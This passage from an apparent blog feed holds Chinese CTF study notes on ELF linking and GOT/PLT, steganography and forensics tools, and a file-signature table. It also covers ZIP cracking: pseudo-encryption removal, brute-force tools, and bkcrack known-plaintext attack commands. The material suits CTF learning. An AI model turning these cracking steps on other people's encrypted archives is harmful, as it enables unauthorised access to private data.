-r main.o</p><p>名为.rel.text的节用于保存.text节的重定位表，同时.rel.text包含两个重定位入口。</p><p>shared的类型R_X86_64_32C用于绝对地址，CPU将直接使用在指令中编码的32位值作为有效地址。</p><p>func的类型R_X86_64_PC32用于相对地址，CPU将指令中编码的32位值加上PC(下一个指令地址)的值得到有效地址。</p><p>func-0x000000000000004中的-0x4是r_addend域中的地址。</p><p>4.后缀名为.a的文件是静态链接库文件，常见的有libc.a</p><p>一个静态链接库可以视为一组目标文件经过打包后形成的集合。执行后编译任务时，需要许多不同目标文件，比如输入输出有printf.o、scanf.o，内存管理malloc.o等。使用ar工具将这些目标文件进行了压缩、编号和索引，形成了libc.a</p><p>命令：ar -t libc.a</p><p>静态链接等缺点</p><ul><li>随着系统中的可执行文件的增加，静态链接带来的磁盘和内存空间浪费问题越发严重</li><li>如果对标准函数做了一点微小的改动，都需要重新编译整个源文件，使得开发和维护很难</li></ul><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>把系统库和自己编写代码分割成两个独立的模块，等程序真正运行时，再把泽两个模块链接，就可以节省磁盘空间，并且内存中等一个系统库可以被多个程序共同使用，还节省物理内存空间，这种在运行或加载时在内存中完成链接等过程叫做动态链接，这些用于动态链接等系统库称为共享库或者共享对象，整个过程由动态链接器完成。</p><p>gcc参数：-shared表示生成共享库，-fpic表示生成与位置无关的代码</p><h1 id="位置无关代码"><a href="#位置无关代码" class="headerlink" title="位置无关代码"></a>位置无关代码</h1><p>可以加载而无须重定向的代码称为位置无关代码(Position-Independent Code,PIC),他是共享库必须具有的属性，通过给GCC传递-fpic参数可以生成。</p><p>通过位置无关代码，一个共享库的代码可以被无限多个进程所共享，从而节约内存资源。</p><p>由于一个程序或者共享库的数据段和代码段段相对距离总是不变的，因此指令和变量之间的距离是一个运行时常量，与绝对内存地址无关，于是就有了全局偏移量表(Global Offset Table,GOT)，他位于数据段的开头，用于保存全局变量和库文件的引用，每个条目占8个字节，在加载时会进行重定向并填入符号的绝对位置。</p><p>为了引入RELRO保护机制，GOT被拆分为.got节和.got.plt节两个部分：</p><p>不需要延迟绑定的前者(.got)用于保存全局变量引用，加载到内存后被标记为只读。</p><p>需要延迟绑定的后着(.got.plt)用于保存函数引用，具有读写权限。</p><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>由于动态链接时由于动态链接器在程序加载时，当需要重定向的符号(库函数)多了之后会影响性能，延迟绑定(lazy binding)就是为了这个问题，基本思想时当函数第一次被调用时，动态链接器材进行符号查找、重定位操作，如果未被调用则不进行绑定。</p><p>ELF文件通过过程链接表(Procedure Linkage Table,PLT)和GOT当配合来实现延迟绑定，每一个被调用的库函数都有一组对应的PLT和GOT。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc技巧</title>
      <link href="/article/2021-11-17-misc%E6%8A%80%E5%B7%A7/"/>
      <url>/article/2021-11-17-misc%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>主要介绍比赛的技巧常用命令。</p><span id="more"></span><h1 id="1-图片隐写"><a href="#1-图片隐写" class="headerlink" title="1.图片隐写"></a>1.图片隐写</h1><p>虚拟机：kali</p><p>工具：binwalk（探测分离），foremost（分离），steghide（分离）、gnuplot（绘图）、volatility（取证）、outguess（图片密码）、notepad（NTFS交换数据流）、NtfsStreamsEditor（NTFS交换数据流）、exiftool（查看隐藏信息）、 uncompyle6和decompyle3（pyc 字节码反编译）</p><h2 id="1-1-探测图片"><a href="#1-1-探测图片" class="headerlink" title="1.1.探测图片"></a>1.1.探测图片</h2><p>首先我们需要对图片进行分析，这里我们需要用到kali里面的一个工具 <a href="https://github.com/devttys0/binwalk">binwalk</a> ，想要了解这个工具可以参考这篇 <a href="http://www.freebuf.com/sectool/15266.html">Binwalk：后门（固件）分析利器</a> 文章，以及 <a href="http://tools.kali.org/forensics/binwalk">kali官方对binwalk的概述和使用介绍</a> 。</p><p>首先在kali终端进入目标图片所在的路径，然后在binwalk后直接提供固件文件路径和文件名即可:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 2.jpg看图片中是不是还有其他东西</span><br></pre></td></tr></table></figure><p>当我们使用这行命令后，binwalk就会自动分析这个jpg文件：</p><h2 id="1-2-分离"><a href="#1-2-分离" class="headerlink" title="1.2.分离"></a>1.2.分离</h2><p>在得到隐藏信息之后我们下一步就是把另一张jpg分离出，以下讨论几种方法：</p><p><strong>（1）使用foremost工具分离</strong></p><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载地址，Linux可以通过下面命令安装使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install foremost</span><br></pre></td></tr></table></figure><p>安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ren * *.jpg#win下面批量重命名，添加后缀名</span><br><span class="line">foremost carter.jpg</span><br><span class="line">binwalk -e mianju.jpg </span><br><span class="line">outguess -k &#x27;密码&#x27; -r 图片 保存的位置 </span><br><span class="line">gnuplot “带有坐标的txt文件”</span><br><span class="line">steghide extract -sf 图片名称 -p 密码</span><br><span class="line">steghide extract -sf out.wav </span><br><span class="line">#这里解压的时候使用Win RAR解压，涉及NTFS流的都需要Win RAR解压</span><br><span class="line">notepad.exe test.txt:hidden.txt或者mspaint.exe test.txt:hidden.jpg</span><br><span class="line">uncompyle6 -o 1.py 1.pycpython反编译</span><br><span class="line">命令：ren * *.jpg</span><br><span class="line">//这条命令会把此目录下所有文件重命名，所以使用的时候注意目录位置</span><br></pre></td></tr></table></figure><p>当我们使用这行命令后，foremost会自动生成output目录存放分离出文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">最常用-查看LSB信息</span><br><span class="line">zsteg 1.png</span><br><span class="line"></span><br><span class="line">检测zlib</span><br><span class="line"># -b的位数是从1开始的</span><br><span class="line">zsteg zlib.bmp -b 1 -o xy -v</span><br><span class="line"></span><br><span class="line">显示细节</span><br><span class="line">zsteg 1.png -v</span><br><span class="line"></span><br><span class="line">尝试所有已知的组合</span><br><span class="line">zsteg 1.png -a</span><br><span class="line"></span><br><span class="line">导出内容</span><br><span class="line">zsteg -E &quot;b1,bgr,lsb,xy&quot; 1.png &gt; 1.exe</span><br></pre></td></tr></table></figure><h2 id="1-3-crc爆破图片长高"><a href="#1-3-crc爆破图片长高" class="headerlink" title="1.3.crc爆破图片长高"></a>1.3.crc爆破图片长高</h2><p>010Editor打开struct PNG_CHUNK chunk[0]下面的struct PNG_CHUNK_IHDR ihdr修改长高即可设置图片信息；也可以使用win10自带的照片-》…-》调整大小-》设置大小</p><p>使用010editor可能会报错，第一个就是需要的信息。</p><p>图片隐写工具：</p><p>010editor、crc爆破长宽脚本、颜色反转、Stegsolve、二维码识别</p><h1 id="2-zip加解密"><a href="#2-zip加解密" class="headerlink" title="2.zip加解密"></a>2.zip加解密</h1><h2 id="2-1-伪加密"><a href="#2-1-伪加密" class="headerlink" title="2.1.伪加密"></a>2.1.伪加密</h2><p>010Editor打开struct ZIPDIRENTRY dirEntry[0]下面的ushort deFlags修改成0即可消除伪加密，可能要在struct ZIPDIRENTRY dirEntry[0]也操作一下</p><h2 id="2-2爆破密码"><a href="#2-2爆破密码" class="headerlink" title="2.2爆破密码"></a>2.2爆破密码</h2><p>可以使用软件对压缩包的账号和密码进行暴力破解。</p><p>软件：rarcrack破解压缩密码、ARCHPR、JPasswordRecoveryTool v1.09</p><h1 id="3-流量分析"><a href="#3-流量分析" class="headerlink" title="3.流量分析"></a>3.流量分析</h1><p>分组字节流，字符串，flag.txt即可查找所有的流量包里面的包含flag.txt的</p><h1 id="4-二维码识别"><a href="#4-二维码识别" class="headerlink" title="4.二维码识别"></a>4.二维码识别</h1><p><a href="https://www.cnblogs.com/Zhan-W/p/14906951.html%E7%BC%BA%E5%B0%91dll%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95">https://www.cnblogs.com/Zhan-W/p/14906951.html缺少dll安装方法</a></p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">import pyzbar.pyzbar as pyzbar</span><br><span class="line">import os</span><br><span class="line">def qrcode_parse_content(img_path):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    单张图片的二维码解析</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    img = Image.open(img_path)</span><br><span class="line">    #使用pyzbar解析二维码图片内容</span><br><span class="line">    barcodes = pyzbar.decode(img)</span><br><span class="line"></span><br><span class="line">    #打印解析结果，从结果上可以看出，data是识别到的二维码内容，rect是二维码所在的位置</span><br><span class="line">    # print(barcodes)</span><br><span class="line">    # [Decoded(data=b&#x27;http://www.h3blog.com&#x27;, type=&#x27;QRCODE&#x27;, rect=Rect(left=7, top=7, width=244, height=244), polygon=[Point(x=7, y=7), Point(x=7, y=251), Point(x=251, y=251), Point(x=251, y=7)])]</span><br><span class="line">    result = []</span><br><span class="line">    res=[]</span><br><span class="line">    for barcode in barcodes:</span><br><span class="line">        barcode_content = barcode.data.decode(&#x27;utf-8&#x27;)</span><br><span class="line">        barcode_hex=barcode.data</span><br><span class="line">        result.append(barcode_content)</span><br><span class="line">        res.append(barcode_hex)</span><br><span class="line">    return result,res</span><br><span class="line">final=qrcode_parse_content(&#x27;./file.png&#x27;)[1][0]</span><br><span class="line">open(&#x27;test.txt&#x27;,&#x27;wb&#x27;).write(final)    </span><br></pre></td></tr></table></figure><p>File Format:文件格式</p><p>Data Extract:数据提取</p><p>Steregram Solve:立体试图 可以左右控制偏移</p><p>Frame Browser:帧浏览器</p><p>Image Combiner:拼图，图片拼接</p><p>用法（使用场景）</p><p>1.File Format:这里你会看见图片的具体信息有时候有些图片隐写的flag会藏在这里</p><p>2.Data Extract:(好多涉及到数据提取的时候，很多博主在wp中都是一带而过，小白们还以为要一个个试。。)</p><p><a href="http://bf.doleczek.pl/">http://bf.doleczek.pl/</a>    特殊字符解密</p><p><a href="https://the-x.cn/base64">https://the-x.cn/base64</a>    流量包里面base64可以直接解密</p><p><a href="https://blog.csdn.net/weixin_43639682/article/details/113857310">(7条消息) stegsolve图片隐写解析器的使用_黑朱雀的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/u011154053/article/details/119864063">https://blog.csdn.net/u011154053/article/details/119864063</a></p><p><a href="https://blog.csdn.net/u012759262/article/details/108763556">https://blog.csdn.net/u012759262/article/details/108763556</a></p><h1 id="5-GitHub"><a href="#5-GitHub" class="headerlink" title="5.GitHub"></a>5.GitHub</h1><p><strong>您可以添加<code>.patch</code>到提交 URL 的末尾以打开补丁视图。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/keebersecuritygroup/security-evaluation-workflow/commit/b25ed7f5aa72f88c0145a3832012546360c2ffc2.patch</span><br><span class="line">和</span><br><span class="line">https://github.com/keebersecuritygroup/security-evaluation-workflow/commit/b25ed7f5aa72f88c0145a3832012546360c2ffc2</span><br></pre></td></tr></table></figure><h1 id="6-代码提示"><a href="#6-代码提示" class="headerlink" title="6.代码提示"></a>6.代码提示</h1><p>字符串固定长度切片，修改步长7即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mi =[content[i:i+7] for i in range(0,len(content),7)]</span><br></pre></td></tr></table></figure><p>在python中不仅二进制可以做异或，十进制也可以</p><h1 id="7-明文攻击"><a href="#7-明文攻击" class="headerlink" title="7.明文攻击"></a>7.明文攻击</h1><p>利用文件名来攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">完整的明文文件</span><br><span class="line">明文文件需要被相同的压缩算法标准压缩（也可理解为被相同压缩工具压缩）</span><br><span class="line">明文对应文件的加密算法需要是 ZipCrypto Store</span><br></pre></td></tr></table></figure><p>ZipCrypto算是传统的zip加密方式。只有使用ZipCrypto Deflate /Store才可以使用 ZIP已知明文攻击进行破解。</p><p>传统的ZIP已知明文攻击利用，windows下可以使用AZPR，linux下可以使用pkcrack。</p><p>要求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">至少已知明文的12个字节及偏移，其中至少8字节需要连续。</span><br><span class="line">明文对应的文件加密方式为ZipCrypto Store</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bkcrack：https://github.com/kimci86/bkcrack</span><br><span class="line"></span><br><span class="line">bkcrack安装：</span><br><span class="line">apt install cmake -y</span><br><span class="line">cmake .</span><br><span class="line">make     //在src下生成bkcrack文件</span><br><span class="line">cp bkcrack /usr/sbin/bkcrack    //作为系统命令使用</span><br><span class="line"></span><br><span class="line">bkcrack常用参数：</span><br><span class="line">-c 提取的密文部分</span><br><span class="line">-p 提取的明文部分</span><br><span class="line">-x 压缩包内目标文件的偏移地址  部分已知明文值</span><br><span class="line">-C 加密压缩包</span><br><span class="line">-o offset  -p参数指定的明文在压缩包内目标文件的偏移量</span><br><span class="line">-d 导出文件</span><br></pre></td></tr></table></figure><p>基本例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zipeasy.zip</span><br><span class="line">- dasflow.pcapng</span><br><span class="line">- dasflow.zip</span><br></pre></td></tr></table></figure><p>2.txt的内容是：dasflow.pcapng</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bkcrack.exe -C zipeasy.zip -c dasflow.zip -p 2.txt -o 30 -x 0 504b0304</span><br><span class="line">bkcrack.exe -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</span><br></pre></td></tr></table></figure><p>可以参考文章：<a href="https://www.freebuf.com/articles/network/255145.html">https://www.freebuf.com/articles/network/255145.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF比赛中常见的文件头</title>
      <link href="/article/2021-10-31-%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
      <url>/article/2021-10-31-%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文整理了CTF比赛中常见的文件头。</p></blockquote><span id="more"></span><h1 id="文件头文件尾总结"><a href="#文件头文件尾总结" class="headerlink" title="文件头文件尾总结"></a>文件头文件尾总结</h1><p>JPEG (jpg)， 　　文件头：FFD8FF　　　　　　　　　　　　　 文件尾：FF D9</p><p>PNG (png)， 　　 文件头：89504E47　　　　　　　　　　　　文件尾：AE 42 60 82</p><p>GIF (gif)， 　　文件头：47494638　　　　　　　　　　　　　　文件尾：00 3B</p><p>ZIP Archive (zip)， 文件头：504B0304　　　　　　　　　　　文件尾：50 4B</p><p>TIFF (tif)， 　 文件头：49492A00　　　　　　　　　　　</p><p>Windows Bitmap (bmp)， 　 文件头：424D　　　　　　</p><p>CAD (dwg)， 　 文件头：41433130　　　　　　　　　　</p><p>Adobe Photoshop (psd)， 文件头：38425053　　　　　</p><p>Rich Text Format (rtf)， 文件头：7B5C727466　　　</p><p>XML (xml)， 文件头：3C3F786D6C　　　　　　　　</p><p>HTML (html)， 文件头：68746D6C3E</p><p>Email [thorough only] (eml)， 文件头：44656C69766572792D646174653A</p><p>Outlook Express (dbx)， 文件头：CFAD12FEC5FD746F</p><p>Outlook (pst)， 文件头：2142444E</p><p>MS Word/Excel (xls.or.doc)， 文件头：D0CF11E0</p><p>MS Access (mdb)， 文件头：5374616E64617264204A</p><p>WordPerfect (wpd)， 文件头：FF575043</p><p>Adobe Acrobat (pdf)， 文件头：255044462D312E</p><p>Quicken (qdf)， 文件头：AC9EBD8F</p><p>Windows Password (pwl)， 文件头：E3828596</p><p>RAR Archive (rar)， 文件头：52617221</p><p>Wave (wav)， 文件头：57415645</p><p>AVI (avi)， 文件头：41564920</p><p>Real Audio (ram)， 文件头：2E7261FD</p><p>Real Media (rm)， 文件头：2E524D46</p><p>MPEG (mpg)， 文件头：000001BA</p><p>MPEG (mpg)， 文件头：000001B3</p><p>Quicktime (mov)， 文件头：6D6F6F76</p><p>Windows Media (asf)， 文件头：3026B2758E66CF11</p><p>MIDI (mid)， 文件头：4D546864</p><h1 id="1、从Ultra－edit-32中提取出来的"><a href="#1、从Ultra－edit-32中提取出来的" class="headerlink" title="1、从Ultra－edit-32中提取出来的"></a>1、从Ultra－edit-32中提取出来的</h1><p>附件:文件格式分析器</p><p>JPEG (jpg)，文件头：FFD8FF</p><p>PNG (png)，文件头：89504E47</p><p>GIF (gif)，文件头：47494638</p><p>TIFF (tif)，文件头：49492A00</p><p>Windows Bitmap (bmp)，文件头：424D</p><p>CAD (dwg)，文件头：41433130</p><p>Adobe Photoshop (psd)，文件头：38425053</p><p>Rich Text Format (rtf)，文件头：7B5C727466</p><p>XML (xml)，文件头：3C3F786D6C</p><p>HTML (html)，文件头：68746D6C3E</p><p>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</p><p>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</p><p>Outlook (pst)，文件头：2142444E</p><p>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</p><p>MS Access (mdb)，文件头：5374616E64617264204A</p><p>WordPerfect (wpd)，文件头：FF575043</p><p>Postscript (eps.or.ps)，文件头：252150532D41646F6265</p><p>Adobe Acrobat (pdf)，文件头：255044462D312E</p><p>Quicken (qdf)，文件头：AC9EBD8F</p><p>Windows Password (pwl)，文件头：E3828596</p><p>ZIP Archive (zip)，文件头：504B0304</p><p>RAR Archive (rar)，文件头：52617221</p><p>Wave (wav)，文件头：57415645</p><p>AVI (avi)，文件头：41564920</p><p>Real Audio (ram)，文件头：2E7261FD</p><p>Real Media (rm)，文件头：2E524D46</p><p>MPEG (mpg)，文件头：000001BA</p><p>MPEG (mpg)，文件头：000001B3</p><p>Quicktime (mov)，文件头：6D6F6F76</p><p>Windows Media (asf)，文件头：3026B2758E66CF11</p><p>MIDI (mid)，文件头：4D546864</p><h1 id="2、从winhex中取出的文件头列表"><a href="#2、从winhex中取出的文件头列表" class="headerlink" title="2、从winhex中取出的文件头列表"></a>2、从winhex中取出的文件头列表</h1><p>File Type ExtensionsHeader</p><p>JPEG jpg;jpeg 0xFFD8FF</p><p>PNG png 0x89504E470D0A1A0A</p><p>GIF gif GIF8</p><p>TIFF tif;tiff 0x49492A00</p><p>TIFF tif;tiff 0x4D4D002A</p><p>Bit map bmp BM</p><p>AOL ART art 0x4A47040E000000</p><p>AOL ART art 0x4A47030E000000</p><p>PC Paintbrush pcx 0x0A050108</p><p>Graphics Metafile wmf 0xD7CDC69A</p><p>Graphics Metafile wmf 0x01000900</p><p>Graphics Metafile wmf 0x02000900</p><p>Enhanced Metafile emf 0x0100000058000000</p><p>Corel Draw cdr CDR</p><p>CAD dwg 0x41433130</p><p>Adobe Photoshop psd 8BPS</p><p>Rich Text Format rtf rtf</p><p>XML xml</p><p>HTML html;htm;PHP;php3;php4;phtml;shtml type</p><p>Email eml Delivery-date:</p><p>Outlook Express dbx 0xCFAD12FE</p><p>Outlookpst!BDN</p><p>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1</p><p>MS Access mdb;mda;mde;mdt Standard J</p><p>WordPerfect wpd 0xFF575043</p><p>OpenOffice Writer sxw writer</p><p>OpenOffice Calc sxc calc</p><p>OpenOffice Math sxm math</p><p>OpenOffice Impress sxi impress</p><p>OpenOffice Draw sxd draw</p><p>Adobe FrameMaker fm &lt;MAKERFILE</p><p>PostScript eps.or.ps;ps;eps %!PS-Adobe</p><p>Adobe Acrobat pdf %PDF-1.</p><p>Quicken qdf 0xAC9EBD8F</p><p>QuickBooks Backup qbb 0x458600000600</p><p>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100</p><p>Sage Backup 1 SAGEBACKUP</p><p>Lotus WordPro v9 lwp 0x576F726450726F</p><p>Lotus 123 v9 123 0x00001A00051004</p><p>Lotus 123 v5 wk4 0x00001A0002100400</p><p>Lotus 123 v3 wk3 0x00001A0000100400</p><p>Lotus 123 v1 wk1 0x2000604060</p><p>Windows Password pwl 0xE3828596</p><p>ZIP Archive zip;jar 0x504B0304</p><p>ZIP Archive (outdated) zip 0x504B3030</p><p>RAR Archive rar Rar!</p><p>GZ Archive gz;tgz 0x1F8B08</p><p>BZIP Archive bz2 BZh</p><p>ARJ Archive arj 0x60EA</p><p>7-ZIP Archive 7z 7z集’</p><p>Wave wav WAVE</p><p>AVI avi AVI</p><p>Real Audio ram;ra .ra?0</p><p>Real Media rm .RMF</p><p>MPEG mpg;mpeg 0x000001BA</p><p>MPEG mpg;mpeg 0x000001B3</p><p>Quicktime mov moov</p><p>Windows Media asf 0x3026B2758E66CF11</p><p>MIDI mid MThd</p><p>Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p><p>Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ</p><p>ELF Executable elf;; 0x7F454C4601010100</p><p>各种文件类型文件头标志位详细列表</p><p>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”</p><p>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”</p><p>474946383961, .gif, “GIF 89A”</p><p>474946383761, .gif, “GIF 87A”</p><p>424D, .bmp, “Windows Bitmap”</p><p>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;</p><p>.cpl;.x32, “Executable File”</p><p>504B0304, .zip, “Zip Compressed”</p><p>3A42617365, .cnt, “”</p><p>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”</p><p>0100000058000000, .emf, “”</p><p>03000000C466C456, .evt, “”</p><p>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”</p><p>1F8B08, .gz, “GZ Compressed File”</p><p>28546869732066696C65, .hqx, “”</p><p>0000010000, .ico, “Icon File”</p><p>4C000000011402, .lnk, “Windows LinkFile”</p><p>25504446, .pdf, “Adobe PDF File”</p><p>5245474544495434, .reg, “”</p><p>7B5C727466,.rtf, “Rich Text Format File”</p><p>lh, .lzh, “Lz compression file”</p><p>MThd, .mid, “”</p><p>0A050108, .pcx, “”</p><p>25215053, .eps, “Adobe EPS File”</p><p>2112, .ain, “AIN Archive File”</p><p>1A02, .arc, “ARC/PKPAK Compressed 1”</p><p>1A03, .arc, “ARC/PKPAK Compressed 2”</p><p>1A04, .arc, “ARC/PKPAK Compressed 3”</p><p>1A08, .arc, “ARC/PKPAK Compressed 4”</p><p>1A09, .arc, “ARC/PKPAK Compressed 5”</p><p>60EA, .arj, “ARJ Compressed”</p><p>41564920, .avi, “Audio Video Interleave(AVI)”</p><p>425A68, .bz;.bz2, “Bzip Archive”</p><p>49536328, .cab, “Cabinet File”</p><p>4C01, .obj, “Compiled Object Module”</p><p>303730373037, .tar;.cpio, “CPIO ArchiveFile”</p><p>4352555348, .cru;.crush, “CRUSH ArchiveFile”</p><p>3ADE68B1, .dcx, “DCX Graphic File”</p><p>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”</p><p>91334846, .hap, “HAP Archive File”</p><p>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”</p><p>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”</p><p>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”</p><p>100, .ico, “ICON File”</p><p>5F27A889, .jar, “JAR Archive File”</p><p>2D6C68352D,.lha, “LHA Compressed”</p><p>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”</p><p>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”</p><p>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”</p><p>20006800200, .fmt, “Lotus 123 v4 FMTfile”</p><p>00001A0002100400, .wk4, “Lotus 123 v5”</p><p>5B7665725D, .ami, “Lotus Ami Pro”</p><p>300000041505052, .adx, “Lotus ApproachADX file”</p><p>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”</p><p>4D47582069747064, .ds4, “MicrografixDesigner 4”</p><p>4D534346, .cab, “Microsoft CAB FileFormat”</p><p>4D546864, .mid, “Midi Audio File”</p><p>000001B3, .mpg;.mpeg, “MPEG Movie”</p><p>0902060000001000B9045C00, .xls, “MS Excel v2”</p><p>0904060000001000F6055C00, .xls, “MS Excel v4”</p><p>7FFE340A,.doc, “MS Word”</p><p>1234567890FF, .doc, “MS Word 6.0”</p><p>31BE000000AB0000, .doc, “MS Word forDOS 6.0”</p><p>1A00000300001100, .nsf, “NotesDatabase”</p><p>7E424B00, .psp, “PaintShop Pro Image File”</p><p>504B0304, .zip, “PKZIP Compressed”</p><p>89504E470D0A, .png, “PNG Image File”</p><p>6D646174, .mov, “QuickTime Movie”</p><p>6D646174, .qt, “Quicktime MovieFile”</p><p>52617221, .rar, “RAR Archive File”</p><p>2E7261FD, .ra;.ram, “Real AudioFile”</p><p>EDABEEDB, .rpm, “RPM Archive File”</p><p>2E736E64, .au, “SoundMachine AudioFile”</p><p>53495421, .sit, “Stuffit v1 ArchiveFile”</p><p>53747566664974, .sit, “Stuffit v5Archive File”</p><p>1F9D, .z, “TAR Compressed ArchiveFile”</p><p>49492A, .tif;.tiff, “TIFF (Intel)”</p><p>4D4D2A,.tif;.tiff, “TIFF (Motorola)”</p><p>554641, .ufa, “UFA Archive File”</p><p>57415645666D74, .wav, “Wave Files”</p><p>D7CDC69A,.wmf, “Windows Meta File”</p><p>4C000000, .lnk, “Windows Shortcut (LinkFile)”</p><p>504B3030504B0304, .zip, “WINZIPCompressed”</p><p>FF575047, .wpg, “WordPerfectGraphics”</p><p>FF575043, .wp, “WordPerfect v5 orv6”</p><p>3C3F786D6C,.xml, “XML Document”</p><p>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”</p><p>3C21454E54495459, .dtd, “XML DTD”</p><p>5A4F4F20, .zoo, “ZOO Archive File”</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 文件头 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>”红明谷“杯数据安全大赛-安全意识赛</title>
      <link href="/article/2021-10-28-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E8%B5%9B/"/>
      <url>/article/2021-10-28-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E8%B5%9B/</url>
      
